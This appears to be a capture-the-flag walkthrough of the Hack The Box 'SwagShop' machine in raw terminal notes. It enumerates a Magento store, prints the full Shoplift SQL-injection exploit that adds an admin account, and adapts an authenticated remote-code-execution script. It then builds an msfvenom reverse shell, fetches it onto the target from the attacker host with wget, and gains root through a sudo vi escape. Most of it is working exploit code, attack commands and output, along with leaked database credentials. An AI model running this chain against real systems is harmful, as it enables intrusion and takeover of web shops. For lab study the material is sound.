RECON
root@kali:~/htb/swagshop# nmap -sC -sV -p- -vv -oA  full 10.10.10.140
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgTCefp89MPJm2oaJqietdslSBur+eCMVQRW19iUL2DQSdZrIctssf/ws4HWN9DuXWB1p7OR9GWQhjeFv+xdb8OLy6EQ72zQOk+cNU9ANi72FZIkpD5A5vHUyhhUSUcnn6hwWMWW4dp6BFVxczAiutSWBVIm2YLmcqwOEOJhfXLVvsVqu8KUmybJQWFaJIeLVHzVgrF1623ekDXMwT7Ktq49RkmqGGE+e4pRy5pWlL2BPVcrSv9nMRDkJTXuoGQ53CRcp9VVi2V7flxTd6547oSPck1N+71Xj/x17sMBDNfwik/Wj3YLjHImAlHNZtSKVUT9Ifqwm973YRV9qtqtGT
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEG18M3bq7HSiI8XlKW9ptWiwOvrIlftuWzPEmynfU6LN26hP/qMJModcHS+idmLoRmZnC5Og9sj5THIf0ZtxPY=
|   256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINmmpsnVsVEZ9KB16eRdxpe75vnX8B/AZMmhrN2i4ES7
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

WEB ENUM
root@kali:~/htb/swagshop# nikto -h 10.10.10.140
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.140
+ Target Hostname:    10.10.10.140
+ Target Port:        80
+ Start Time:         2020-12-06 09:26:46 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4f8d3f475ee80 
+ OSVDB-39272: favicon.ico file identifies this server as: Magento Go CMS
+ OSVDB-39272: favicon.ico file identifies this server as: Magento Go CMS
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /app/: Directory indexing found.
+ OSVDB-3092: /app/: This might be interesting...
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3268: /lib/: Directory indexing found.
+ OSVDB-3092: /lib/: This might be interesting...
+ OSVDB-3092: /install.php: install.php file found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /RELEASE_NOTES.txt: A database error may reveal internal details about the running database.
+ /RELEASE_NOTES.txt: Magento Shop Changelog identified.
+ 7500 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-12-06 09:31:36 (GMT-5) (290 seconds)


root@kali:~/htb/swagshop# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  http://10.10.10.140 -x png,txt,db,php,jpg,py,pl,config,html -s 200,204,301,302,307,403 -t 100

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.140/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,403,200,204,301
[+] Extensions   : .png,.txt,.db,.php,.jpg,.py,.pl,.config,.html
=====================================================
/media (Status: 301)
/index.php (Status: 200)
/includes (Status: 301)
/lib (Status: 301)
/install.php (Status: 200)
/app (Status: 301)
/js (Status: 301)
/api.php (Status: 200)
/shell (Status: 301)
/skin (Status: 301)
/cron.php (Status: 200)
/LICENSE.txt (Status: 200)
/LICENSE.html (Status: 200)
/var (Status: 301)
/errors (Status: 301)
/mage (Status: 200)
/server-status (Status: 403)
=====================================================

SSH ENUM
root@kali:~/htb/swagshop# nc 10.10.10.140 22
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8

REVIEW MAGENTO INSTALL AND CONFIG FILES

GET MAGENTO GO CMS MAGE VERSION
http://10.10.10.140/app/code/core/Mage/Log/etc/config.xml
<config><modules><Mage_Log><version>1.6.1.0</version></Mage_Log></modules>



http://10.10.10.140/app/etc/local.xml
<config><global><install><date>Wed, 08 May 2019 07:23:09 +0000</date></install><crypt><key>b355a9e0cd018d3f7f03607141518419</key></crypt><disable_local_modules>false</disable_local_modules><resources><db><table_prefix></table_prefix></db><default_setup><connection><host>localhost</host><username>root</username><password>fMVWh7bDHpgZkyfqQXreTjU9</password><dbname>swagshop</dbname><initStatements>SET NAMES utf8</initStatements><model>mysql4</model><type>pdo_mysql</type><pdoType></pdoType><active>1</active></connection></default_setup></resources><session_save>files</session_save></global><admin><routers><adminhtml><args><frontName>admin</frontName></args></adminhtml></routers></admin></config>

CREATE PYTHON SCRIPT TO FIND MAGENTO VERSION
root@kali:~/htb/swagshop# wget http://10.10.10.140/skin/frontend/default/default/css/styles.css
root@kali:~/htb/swagshop# md5sum styles.css
d9c659f7c70e070394eff4290a0a601a  styles.css
root@kali:~/htb/swagshop# vim style.sh
root@kali:~/htb/swagshop# cat style.sh
#!/bin/bash

repo="magento-mirror"
styles_file="skin/frontend/default/default/css/styles.css"
target_hash="d9c659f7c70e070394eff4290a0a601a"

if [[ ! -d "${repo}" ]]; then
  git clone https://github.com/OpenMage/magento-mirror.git
 fi

pushd "${repo}" >/dev/null || exit

for tag in $(git tag -l); do
  git checkout tags/"${tag}" 2>/dev/null

  if [[ ! -e "$(pwd)/${styles_file}" ]]; then
    continue
  fi

  ver_hash=$(md5sum "$(pwd)/${styles_file}" | awk '{print $1}')

  if [[ "${ver_hash}" == "${target_hash}" ]]; then
    echo "Found version: ${tag}"
    break
  fi
done

popd >/dev/null || exit

RUN SCRIPT TO GET MAGENTO VERSION
root@kali:~/htb/swagshop# ./style.sh 
Cloning into 'magento-mirror'...
remote: Enumerating objects: 234769, done.
remote: Total 234769 (delta 0), reused 0 (delta 0), pack-reused 234769
Receiving objects: 100% (234769/234769), 111.58 MiB | 1.65 MiB/s, done.
Resolving deltas: 100% (141103/141103), done.
Checking out files: 100% (14467/14467), done.
Found version: 1.9.0.0

SEARCH FOR EXPLOIT
root@kali:~/htb/swagshop# searchsploit magento
--------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                           |  Path
                                                                                                         | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------- ----------------------------------------
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting       | exploits/php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting | exploits/php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                | exploits/php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                           | exploits/php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                             | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                   | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                              | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                                                | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                             | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                  | exploits/php/webapps/38651.txt
--------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

TRY Magento eCommerce - Remote Code Execution 
root@kali:~/htb/swagshop# searchsploit -m exploits/xml/webapps/37977.py
  Exploit: Magento eCommerce - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/37977/
     Path: /usr/share/exploitdb/exploits/xml/webapps/37977.py
File Type: ASCII text, with CRLF line terminators

Copied to: /root/htb/swagshop/37977.py


root@kali:~/htb/swagshop# cat 37977.py 
##################################################################################################
#Exploit Title : Magento Shoplift exploit (SUPEE-5344)
#Author        : Manish Kishan Tanwar AKA error1046
#Date          : 25/08/2015
#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
#Debugged At  : Indishell Lab(originally developed by joren)
##################################################################################################

////////////////////////
/// Overview:
////////////////////////

Magento shoplift bug originally discovered by CheckPoint team (http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/)
This python script developed by joren but it was having some bug because of which it was not working properly.
If magento version is vulnerable, this script will create admin account with username forme and password forme

 

////////////////
///  POC   ////
///////////////
Exploit script starts here
///////////////////
#Thanks to
# Zero cool, code breaker ICA, Team indishell, my father , rr mam, jagriti and DON  
import requests
import base64
import sys

target = "http://target.com/"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url, 
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds forme:forme".format(target)
else:
    print "DID NOT WORK"





/////////////////
exploit code ends here




                             --==[[ Greetz To ]]==--
############################################################################################
#Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba, 
#Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
#Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
#Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash
#############################################################################################
                             --==[[Love to]]==--
# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
#Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty and Don(Deepika kaushik)
                       --==[[ Special Fuck goes to ]]==--
                            <3  suriya Cyber Tyson <3

root@kali:~/htb/swagshop# cp 37977.py swag.py

REMOVE NON PYTHON CODE
root@kali:~/htb/swagshop# vim swag.py

RUN EXPLOIT SCRIPT 
root@kali:~/htb/swagshop# python swag.py 
DID NOT WORK

REVIEW EXPLOIT WITH BURP BY ADDING PROXIES TO SCRIPT
root@kali:~/htb/swagshop# vim swag.py 
r = requests.post(target_url, proxies={'http': 'localhost:8080'},

RUN SCRIPT AND INTERCEPT WITH BURP
root@kali:~/htb/swagshop# python swag.py 

REQUEST
POST /admin/Cms_Wysiwyg/directive/index/ HTTP/1.1
Host: 10.10.10.140
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.18.4
Content-Length: 999
Content-Type: application/x-www-form-urlencoded

filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdmb3JtZScpICksIENPTkNBVCgnOicsIEBTQUxUICkpO1NFTEVDVCBARVhUUkEgOj0gTUFYKGV4dHJhKSBGUk9NIGFkbWluX3VzZXIgV0hFUkUgZXh0cmEgSVMgTk9UIE5VTEw7SU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCxgZW1haWxgLGB1c2VybmFtZWAsYHBhc3N3b3JkYCxgY3JlYXRlZGAsYGxvZ251bWAsYHJlbG9hZF9hY2xfZmxhZ2AsYGlzX2FjdGl2ZWAsYGV4dHJhYCxgcnBfdG9rZW5gLGBycF90b2tlbl9jcmVhdGVkX2F0YCkgVkFMVUVTICgnRmlyc3RuYW1lJywnTGFzdG5hbWUnLCdlbWFpbEBleGFtcGxlLmNvbScsJ2Zvcm1lJyxAUEFTUyxOT1coKSwwLDAsMSxARVhUUkEsTlVMTCwgTk9XKCkpO0lOU0VSVCBJTlRPIGBhZG1pbl9yb2xlYCAocGFyZW50X2lkLHRyZWVfbGV2ZWwsc29ydF9vcmRlcixyb2xlX3R5cGUsdXNlcl9pZCxyb2xlX25hbWUpIFZBTFVFUyAoMSwyLDAsJ1UnLChTRUxFQ1QgdXNlcl9pZCBGUk9NIGFkbWluX3VzZXIgV0hFUkUgdXNlcm5hbWUgPSAnZm9ybWUnKSwnRmlyc3RuYW1lJyk7&___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&forwarded=1

RESPONSE
HTTP/1.1 404 Not Found
Date: Sun, 06 Dec 2020 19:02:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 310
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /admin/Cms_Wysiwyg/directive/index/ was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.140 Port 80</address>
</body></html>

ADJUST THE SCRIPT
http://10.10.10.140/index.php/admin
root@kali:~/htb/swagshop# vim swag.py

EDIT
target = "http://10.10.10.140/"
TO
target = "http://10.10.10.140/index.php"

EDIT
target_url = target + "/admin/Cms_Wysiwyg/directive/index/"
TO
target_url = target + "/"
REMOVE PROXIES
r = requests.post(target_url, proxies={'http': 'localhost:8080'},

RUN EXPLOIT SCRIPT 
root@kali:~/htb/swagshop# python swag.py 
WORKED
Check http://10.10.10.140/index.php/admin with creds forme:forme

LOGIN TO MAGENO PORTAL AS USER FORME
http://10.10.10.140/index.php/admin/dashboard/index/key/ba140afd5b9ffa2590a56543bc5b1454/

REVIEW THE MAGENTO EXPLOITS AGAIN FOR REMOTE CODE EXECUTION
root@kali:~/htb/swagshop# searchsploit -m 37811
  Exploit: Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/37811/
     Path: /usr/share/exploitdb/exploits/php/webapps/37811.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/htb/swagshop/37811.py

ADD USERNAME AND PASSWORD TO THE SCRIPT
root@kali:~/htb/swagshop# vim 37811.py
# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml

ALSO GET INSTALL DATE AS SPECIFIED FROM SCRIPT HERE
http://10.10.10.140/app/etc/local.xml

root@kali:~/htb/swagshop# vim 37811.py
# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml


RUN THE SCRIPT
root@kali:~/htb/swagshop# python 37811.py http://10.10.10.140/index.php/admin 'uname -a'
Traceback (most recent call last):
  File "37811.py", line 69, in <module>
    tunnel = tunnel.group(1)
AttributeError: 'NoneType' object has no attribute 'group'

REVIEW FAILURE BY INTERCEPTING REQUEST WITH BURP
root@kali:~/htb/swagshop# vim 37811.py
EDIT
#br.set_proxies({"http": "localhost:8080"})
TO
br.set_proxies({"http": "localhost:8080"})

REQUEST
POST /index.php/admin HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Length: 84
Connection: close
User-Agent: Python-urllib/2.7
Host: 10.10.10.140
Cookie: adminhtml=e8kha9vg77ma2mbr2c7u50ed90
Referer: http://10.10.10.140/index.php/admin
Content-Type: application/x-www-form-urlencoded

login%5Busername%5D=forme&form_key=5d6cMHAG4os37mqg&dummy=&login%5Bpassword%5D=forme

RESPONSE
HTTP/1.1 302 Found
Date: Sun, 06 Dec 2020 19:37:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: adminhtml=e8kha9vg77ma2mbr2c7u50ed90; expires=Sun, 06-Dec-2020 20:37:47 GMT; Max-Age=3600; path=/; domain=10.10.10.140; httponly
Set-Cookie: adminhtml=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; domain=10.10.10.140; httponly
Set-Cookie: adminhtml=3316j5mklhms5emrl15n9sr084; expires=Sun, 06-Dec-2020 20:37:47 GMT; Max-Age=3600; path=/; domain=10.10.10.140; HttpOnly
Location: http://10.10.10.140/index.php/admin/index/index/key/1c9e61dc31328d32124dab66f5062d0f/
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

UPDATE THE TIME OPTION VALUE
EDIT
7D
TO
2YTD

THE IMG SRC CONTAINS THE GA ATTRIBUTE NEEDED FOR THE SCRIPT TO RUN
<img src="http://10.10.10.140/index.php/admin/dashboard/tunnel/key/ca812f83758a75b3aaa3bfc037ceef46/?ga=YTo5OntzOjM6ImNodCI7czoyOiJsYyI7czozOiJjaGYiO3M6Mzk6ImJnLHMsZjRmNGY0fGMsbGcsOTAsZmZmZmZmLDAuMSxlZGVkZWQsMCI7czozOiJjaG0iO3M6MTQ6IkIsZjRkNGIyLDAsMCwwIjtzOjQ6ImNoY28iO3M6NjoiZGI0ODE0IjtzOjM6ImNoZCI7czozODoiZTpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBcXFBQUFBQUEiO3M6NDoiY2h4dCI7czozOiJ4LHkiO3M6NDoiY2h4bCI7czo3MzoiMDp8fHwwMy8yMDE4fHx8MDgvMjAxOHx8fDExLzIwMTh8fHwwMi8yMDE5fHx8MDUvMjAxOXx8fDA4LzIwMTl8MTp8MHwxfDJ8MyI7czozOiJjaHMiO3M6NzoiNTg3eDMwMCI7czozOiJjaGciO3M6MzU6IjUuODgyMzUyOTQxMTc2NSwzMy4zMzMzMzMzMzMzMzMsMSwwIjt9&h=2a0701ca236e48580d40996a62bd3b51" alt="chart" title="chart" />

UPDATE THE SCRIPT
root@kali:~/htb/swagshop# vim 37811.py 
EDIT
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
TO
request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)

COMMENT PROXIES IN SCRIPT
#br.set_proxies({"http": "localhost:8080"})

RERUN THE RCE SCRIPT
root@kali:~/htb/swagshop# python 37811.py http://10.10.10.140/index.php/admin 'uname -a'
Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

GENERATE REVERSE SHELL PAYLOAD
root@kali:~/htb/swagshop# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=1234 -f elf -o swag.elf

SERVE THE PAYLOAD
root@kali:~/htb/swagshop# python -m SimpleHTTPServer 80

UPLOAD THE PAYLOAD TO SWAGSHOP
root@kali:~/htb/swagshop# python 37811.py http://10.10.10.140/index.php/admin 'wget 10.10.14.8/swag.elf'

MAKE IT EXECUTABLE AND RUN
python 37811.py http://10.10.10.140/index.php/admin 'chmod +x swag.elf && ./swag.elf'

GET REVERSE SHELL
root@kali:~/htb/swagshop# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.140: inverse host lookup failed: Unknown host
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.140] 60520
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
pwd
/var/www/html
hostname
swagshop
ls -l /home
total 4
drwxr-xr-x 3 haris haris 4096 May  8  2019 haris

GET USER FLAG
cat /home/haris/user.txt
######################################

CHECK SUDO PERMISSIONS
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*

RUN SUDO COMMAND
sudo /usr/bin/vi /var/www/html/test

ADD ESCAPE IN VI EDITOR
:!sh

GET ROOT SHELL
id
uid=0(root) gid=0(root) groups=0(root)

GET ROOT FLAG
cat /root/root.txt
################################


   ___ ___
 /| |/|\| |\
/_| Â´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!




























